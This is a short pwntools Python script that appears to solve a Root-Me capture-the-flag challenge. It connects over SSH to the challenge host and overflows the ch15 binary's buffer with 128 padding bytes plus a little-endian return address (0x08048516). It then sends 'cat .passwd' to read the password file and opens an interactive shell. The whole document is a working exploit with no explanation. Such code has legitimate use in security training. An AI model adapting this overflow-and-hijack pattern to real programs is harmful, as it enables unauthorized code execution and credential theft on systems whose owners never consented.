from pwn import *


socket = ssh(host='challenge02.root-me.org', user='app-systeme-ch15', password='app-systeme-ch15', port=2222)
p = socket.process('./ch15')

sh_address = 0x08048516
print(f"LE address : {sh_address.to_bytes(4, 'little')}")
payload = b'a' * 128 + sh_address.to_bytes(4, 'little') 
p.sendline(payload)
p.sendline('cat .passwd')
p.interactive()